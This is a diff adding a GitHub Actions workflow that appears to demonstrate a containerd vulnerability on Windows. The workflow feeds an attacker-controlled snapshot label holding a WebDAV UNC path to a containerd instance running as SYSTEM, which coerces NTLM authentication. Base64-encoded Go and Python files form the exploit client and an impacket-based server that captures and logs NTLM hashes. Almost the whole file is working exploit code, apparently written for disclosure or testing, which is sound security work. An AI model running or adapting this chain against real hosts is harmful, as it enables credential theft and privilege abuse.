@@ -1,0 +1,81 @@
+name: D17 LCOW WebDAV NTLM capture
+on:
+  workflow_dispatch:
+
+jobs:
+  webdav:
+    runs-on: windows-latest
+    timeout-minutes: 30
+    steps:
+      - name: Setup - containerd, harness, stub, impacket, NTLM HTTP server
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $base = 'C:\ctdpoc'
+          New-Item -ItemType Directory -Force -Path "$base\bin","$base\root","$base\state","$base\canary","$base\go","$base\stub","$base\share" | Out-Null
+          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
+          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
+          $cfg='dmVyc2lvbiA9IDIKcm9vdCA9ICJDOi9jdGRwb2Mvcm9vdCIKc3RhdGUgPSAiQzovY3RkcG9jL3N0YXRlIgpbcGx1Z2lucy4naW8uY29udGFpbmVyZC5zZXJ2ZXIudjEuZ3JwYyddCiAgYWRkcmVzcyA9ICdcXC5ccGlwZVxjdGQtZ3JwYycKW3BsdWdpbnMuJ2lvLmNvbnRhaW5lcmQuc2VydmVyLnYxLnR0cnBjJ10KICBhZGRyZXNzID0gJ1xcLlxwaXBlXGN0ZC10dHJwYycKW2RlYnVnXQogIGxldmVsID0gJ2RlYnVnJwo='; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
+          $gm='bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'; [IO.File]::WriteAllBytes("$base\go\go.mod",[Convert]::FromBase64String($gm))
+          $mn='cGFja2FnZSBtYWluCgppbXBvcnQgKAogICAgImNvbnRleHQiCiAgICAiZm10IgogICAgIm9zIgoKICAgICJnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92Mi9jbGllbnQiCiAgICAiZ2l0aHViLmNvbS9jb250YWluZXJkL2NvbnRhaW5lcmQvdjIvY29yZS9zbmFwc2hvdHMiCikKCmZ1bmMgbWFpbigpIHsKICAgIC8vIGFyZ3M6IDxhZGRyZXNzPiA8bmFtZXNwYWNlPiA8c25hcHNob3R0ZXI+IDxrZXk+IDxsYWJlbC1rZXk+IDxsYWJlbC12YWx1ZT4KICAgIGlmIGxlbihvcy5BcmdzKSA8IDcgewogICAgICAgIGZtdC5QcmludGxuKCJuZWVkIDYgYXJncyIpCiAgICAgICAgb3MuRXhpdCgyKQogICAgfQogICAgYWRkciwgbnMsIHNuYXAsIGtleSwgbGssIGx2IDo9IG9zLkFyZ3NbMV0sIG9zLkFyZ3NbMl0sIG9zLkFyZ3NbM10sIG9zLkFyZ3NbNF0sIG9zLkFyZ3NbNV0sIG9zLkFyZ3NbNl0KICAgIGN0eCA6PSBjb250ZXh0LkJhY2tncm91bmQoKQogICAgYywgZXJyIDo9IGNsaWVudC5OZXcoYWRkciwgY2xpZW50LldpdGhEZWZhdWx0TmFtZXNwYWNlKG5zKSkKICAgIGlmIGVyciAhPSBuaWwgewogICAgICAgIGZtdC5QcmludGxuKCJjbGllbnQgZXJyOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBkZWZlciBjLkNsb3NlKCkKCiAgICAvLyBUaGlzIG1pcnJvcnMgQ1JJIFJ1blBvZFNhbmRib3g6IHVudHJ1c3RlZCBwb2QgYW5ub3RhdGlvbnMgYXJlIHBhc3NlZAogICAgLy8gdmVyYmF0aW0gYXMgc25hcHNob3QgbGFiZWxzIHRvIFNuYXBzaG90dGVyLlByZXBhcmUgdmlhIFdpdGhMYWJlbHMuCiAgICBtYWxpY2lvdXMgOj0gbWFwW3N0cmluZ11zdHJpbmd7bGs6IGx2fQogICAgc3MgOj0gYy5TbmFwc2hvdFNlcnZpY2Uoc25hcCkKICAgIG1vdW50cywgZXJyIDo9IHNzLlByZXBhcmUoY3R4LCBrZXksICIiLCBzbmFwc2hvdHMuV2l0aExhYmVscyhtYWxpY2lvdXMpKQogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgICAgZm10LlByaW50bG4oIlBSRVBBUkVfRVJSOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBmbXQuUHJpbnRsbigiUFJFUEFSRV9PSyBtb3VudHM6IiwgbW91bnRzKQp9Cg=='; [IO.File]::WriteAllBytes("$base\go\main.go",[Convert]::FromBase64String($mn))
+          $st='Ly9nbzpidWlsZCB3aW5kb3dzCgovLyBydW5oY3Nfc3R1Yi5nbyAtIExBQiBIQVJORVNTIGZvciB0aGUgSHlwZXItVi1kZXBlbmRlbnQgcnVuaGNzLmV4ZSBoZWxwZXIuCi8vIEltcGxlbWVudHMgdGhlIG5hcnJvdyBpbnRlcmZhY2UgY29udGFpbmVyZCdzIExDT1cgc25hcHNob3R0ZXIgdXNlczoKLy8gICBydW5oY3MuZXhlIDxnbG9iYWwgZmxhZ3M+IGNyZWF0ZS1zY3JhdGNoIC0tZGVzdHBhdGggPHBhdGg+Ci8vIEl0IGNyZWF0ZXMgYSBmaWxlIGF0IDxwYXRoPiAoYSBzdGFuZC1pbiBmb3IgdGhlIGV4dDQgVkhEWCB0aGF0IGdlbnVpbmUKLy8gcnVuaGNzIHByb2R1Y2VzIHZpYSBhIFVWTSkuIFRoaXMgaXMgTk9UIHRoZSB2dWxuZXJhYmlsaXR5IC0gdGhlIHZ1bG5lcmFibGUKLy8gY29kZSBpcyBjb250YWluZXJkJ3MgdXNlIG9mIGFuIGF0dGFja2VyLWNvbnRyb2xsZWQgbGFiZWwgYXMgYSBmaWxlc3lzdGVtCi8vIHBhdGgsIHdoaWNoIHJ1bnMgZm9yIHJlYWwgaW4gdGhpcyBQb0MuCnBhY2thZ2UgbWFpbgoKaW1wb3J0ICgKICAgICJmbXQiCiAgICAib3MiCikKCmZ1bmMgbWFpbigpIHsKICAgIGRlc3QgOj0gIiIKICAgIGZvciBpLCBhIDo9IHJhbmdlIG9zLkFyZ3MgewogICAgICAgIGlmIGEgPT0gIi0tZGVzdHBhdGgiICYmIGkrMSA8IGxlbihvcy5BcmdzKSB7CiAgICAgICAgICAgIGRlc3QgPSBvcy5BcmdzW2krMV0KICAgICAgICB9CiAgICB9CiAgICBpZiBkZXN0ID09ICIiIHsKICAgICAgICBmbXQuRnByaW50bG4ob3MuU3RkZXJyLCAicnVuaGNzIHN0dWI6IC0tZGVzdHBhdGggcmVxdWlyZWQiKQogICAgICAgIG9zLkV4aXQoMSkKICAgIH0KICAgIGYsIGVyciA6PSBvcy5PcGVuRmlsZShkZXN0LCBvcy5PX0NSRUFURXxvcy5PX1dST05MWXxvcy5PX1RSVU5DLCAwNjAwKQogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgICAgZm10LkZwcmludGxuKG9zLlN0ZGVyciwgInJ1bmhjcyBzdHViOiBvcGVuOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICAvLyBtaW5pbWFsIFZIRFgtbGlrZSBwbGFjZWhvbGRlciBjb250ZW50ICg1MTIgYnl0ZXMpCiAgICBidWYgOj0gbWFrZShbXWJ5dGUsIDUxMikKICAgIGNvcHkoYnVmLCBbXWJ5dGUoImNvbnRhaW5lZCB2aXJ0YWwgZGlzayBwbGFjZWhvbGRlciAobGFiIGhhcm5lc3MpIikpCiAgICBpZiBfLCBlcnIgOj0gZi5Xcml0ZShidWYpOyBlcnIgIT0gbmlsIHsKICAgICAgICBmLkNsb3NlKCkKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBmLkNsb3NlKCkKICAgIGZtdC5QcmludGxuKCJydW5oY3Mgc3R1YjogY3JlYXRlZCIsIGRlc3QpCn0K'; [IO.File]::WriteAllBytes("$base\stub\main.go",[Convert]::FromBase64String($st))
+          $sv='aW1wb3J0IGJhc2U2NCwgc3lzCmZyb20gaHR0cC5zZXJ2ZXIgaW1wb3J0IEhUVFBTZXJ2ZXIsIEJhc2VIVFRQUmVxdWVzdEhhbmRsZXIKZnJvbSBpbXBhY2tldC5udGxtIGltcG9ydCBOVExNQXV0aENoYWxsZW5nZSwgTlRMTUF1dGhDaGFsbGVuZ2VSZXNwb25zZQoKQ0hBTCA9IGInRDE3Q0hBTE4nCkxPRyA9IHInQzpcY3RkcG9jXG50bG1faHR0cC5sb2cnCgpkZWYgbG9nKHMpOgogICAgd2l0aCBvcGVuKExPRywgJ2EnKSBhcyBmOgogICAgICAgIGYud3JpdGUocyArICdcbicpCgpkZWYgbWFrZV90eXBlMigpOgogICAgYyA9IE5UTE1BdXRoQ2hhbGxlbmdlKCkKICAgIGNbJ2NoYWxsZW5nZSddID0gQ0hBTAogICAgY1snZG9tYWluX25hbWUnXSA9ICdQT0MnLmVuY29kZSgndXRmLTE2bGUnKQogICAgY1snZmxhZ3MnXSA9IDB4MDAwODgyMDcKICAgIGNbJ1RhcmdldEluZm9GaWVsZHMnXSA9IGInJwogICAgY1snVGFyZ2V0SW5mb0ZpZWxkc19sZW4nXSA9IDAKICAgIGNbJ1RhcmdldEluZm9GaWVsZHNfbWF4X2xlbiddID0gMAogICAgY1snVGFyZ2V0SW5mb0ZpZWxkc19vZmZzZXQnXSA9IDAKICAgIGNbJ1ZlcnNpb24nXSA9IGInXHhmZicgKiA4CiAgICBjWydWZXJzaW9uTGVuJ10gPSA4CiAgICByZXR1cm4gYy5nZXREYXRhKCkKCmNsYXNzIEgoQmFzZUhUVFBSZXF1ZXN0SGFuZGxlcik6CiAgICBkZWYgZG9fR0VUKHNlbGYpOgogICAgICAgIGF1dGggPSBzZWxmLmhlYWRlcnMuZ2V0KCdBdXRob3JpemF0aW9uJywgJycpCiAgICAgICAgbG9nKCdSRVEgcGF0aD0lcyBhdXRoPSVzJyAlIChzZWxmLnBhdGgsIGF1dGhbOjQwXSkpCiAgICAgICAgaWYgbm90IGF1dGgubG93ZXIoKS5zdGFydHN3aXRoKCdudGxtICcpOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAxKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlJywgJ05UTE0nKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LUxlbmd0aCcsICcwJykKICAgICAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGJsb2IgPSBiYXNlNjQuYjY0ZGVjb2RlKGF1dGhbNTpdKQogICAgICAgIG1zZ3R5cGUgPSBpbnQuZnJvbV9ieXRlcyhibG9iWzg6MTJdLCAnbGl0dGxlJykgaWYgbGVuKGJsb2IpID49IDEyIGVsc2UgMAogICAgICAgIGlmIG1zZ3R5cGUgPT0gMToKICAgICAgICAgICAgdDIgPSBtYWtlX3R5cGUyKCkKICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDQwMSkKICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcignV1dXLUF1dGhlbnRpY2F0ZScsICdOVExNICcgKyBiYXNlNjQuYjY0ZW5jb2RlKHQyKS5kZWNvZGUoKSkKICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcignQ29udGVudC1MZW5ndGgnLCAnMCcpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiBtc2d0eXBlID09IDM6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG0gPSBOVExNQXV0aENoYWxsZW5nZVJlc3BvbnNlKGJsb2IpCiAgICAgICAgICAgICAgICB1c2VyID0gbVsndXNlcl9uYW1lJ10uZGVjb2RlKCd1dGYtMTZsZScsICdyZXBsYWNlJykKICAgICAgICAgICAgICAgIGRvbSA9IG1bJ2RvbWFpbl9uYW1lJ10uZGVjb2RlKCd1dGYtMTZsZScsICdyZXBsYWNlJykKICAgICAgICAgICAgICAgIG50ID0gYnl0ZXMobVsnbnRsbSddKS5oZXgoKQogICAgICAgICAgICAgICAgbG0gPSBieXRlcyhtWydsYW5tYW4nXSkuaGV4KCkKICAgICAgICAgICAgICAgIGxvZygnTlRMTV9UWVBFM19DQVBUVVJFRCB1c2VyPSVzIGRvbWFpbj0lcyBjaGFsbGVuZ2U9JXMgbnRyZXNwPSVzIGxtcmVzcD0lcycgJSAodXNlciwgZG9tLCBDSEFMLmhleCgpLCBudCwgbG0pKQogICAgICAgICAgICAgICAgbG9nKCdOVExNX1RZUEUzX0I2ND0nICsgYmFzZTY0LmI2NGVuY29kZShibG9iKS5kZWNvZGUoKSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgbG9nKCdQQVJTRV9FUlIgJyArIHJlcHIoZSkpCiAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSg0MDQpCiAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtTGVuZ3RoJywgJzAnKQogICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDQwMSkKICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlJywgJ05UTE0nKQogICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtTGVuZ3RoJywgJzAnKQogICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQoKICAgIGRlZiBsb2dfbWVzc2FnZShzZWxmLCAqYXJncyk6CiAgICAgICAgcGFzcwoKSFRUUFNlcnZlcigoJzAuMC4wLjAnLCA4MDgwKSwgSCkuc2VydmVfZm9yZXZlcigpCg=='; [IO.File]::WriteAllBytes("$base\ntlm_http_server.py",[Convert]::FromBase64String($sv))
+          Set-Content "$base\stub\go.mod" -Value "module stub`n`ngo 1.24" -Encoding ascii
+          $env:GO111MODULE='on'
+          Set-Location "$base\go"; go mod tidy 2>&1 | Out-Null; go build -o "$base\poc.exe" . 2>&1 | Out-Null
+          Write-Output "BUILD_POC_EXIT=$LASTEXITCODE"
+          Set-Location "$base\stub"; go build -o "$base\bin\bin\runhcs.exe" . 2>&1 | Out-Null
+          Write-Output "BUILD_STUB_EXIT=$LASTEXITCODE"
+          python -m pip install --quiet impacket 2>&1 | Select-Object -Last 3
+          Write-Output "PIP_EXIT=$LASTEXITCODE"
+
+      - name: WebClient + NTLM HTTP server + containerd(SYSTEM) + trigger
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Continue'
+          $base='C:\ctdpoc'
+          # WebClient service (WebDAV redirector)
+          Write-Output '=== WebClient service ==='
+          Get-Service WebClient -ErrorAction SilentlyContinue | Select-Object Name,Status,StartType | Format-Table
+          Set-Service WebClient -StartupType Automatic -ErrorAction SilentlyContinue
+          Start-Service WebClient -ErrorAction SilentlyContinue
+          Get-Service WebClient -ErrorAction SilentlyContinue | Select-Object Name,Status | Format-Table
+          # NTLM HTTP capture server on 8080
+          $pSrv = Start-Process -FilePath "python" -ArgumentList @("$base\ntlm_http_server.py") -RedirectStandardOutput "$base\srv_stdout.log" -RedirectStandardError "$base\srv_stderr.log" -PassThru
+          Write-Output "HTTP_SRV_PID=$($pSrv.Id)"
+          Start-Sleep -Seconds 4
+          # containerd AS SYSTEM
+          $act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$base\bin\bin\containerd.exe --config $base\config.toml --log-level debug > $base\stdout.log 2> $base\stderr.log`""
+          $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+          $task = New-ScheduledTask -Action $act -Principal $prin
+          Register-ScheduledTask -TaskName 'ctdpoc-daemon' -InputObject $task -Force | Out-Null
+          Start-ScheduledTask -TaskName 'ctdpoc-daemon'
+          Start-Sleep -Seconds 10
+          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
+          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'windows-lcow'
+          $unc = '\\127.0.0.1@8080\SHARE'
+          Write-Output "=== malicious WebDAV UNC label: $unc ==="
+          & "$base\poc.exe" '\\.\pipe\ctd-grpc' 'd17poc' 'windows-lcow' 'victim-webdav' 'containerd.io/snapshot/io.microsoft.container.storage.rootfs.location' $unc 2>&1 | Tee-Object -FilePath "$base\prepare_webdav.out"
+          Write-Output "POC_EXIT=$LASTEXITCODE"
+          Start-Sleep -Seconds 5
+          Write-Output '=== NTLM HTTP capture log ==='
+          if (Test-Path "$base\ntlm_http.log") { Get-Content "$base\ntlm_http.log" -Tail 40 } else { Write-Output 'NO LOG' }
+          Write-Output '=== server stderr ==='
+          if (Test-Path "$base\srv_stderr.log") { Get-Content "$base\srv_stderr.log" -Tail 20 }
+          Write-Output '=== daemon log tail ==='
+          if (Test-Path "$base\stderr.log") { Get-Content "$base\stderr.log" -Tail 15 }
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ctd-webdav-evidence
+          path: |
+            C:\ctdpoc\ntlm_http.log
+            C:\ctdpoc\srv_stderr.log
+            C:\ctdpoc\srv_stdout.log
+            C:\ctdpoc\prepare_webdav.out
+            C:\ctdpoc\stderr.log
+            C:\ctdpoc\stdout.log
+            C:\ctdpoc\config.toml
+          if-no-files-found: warn
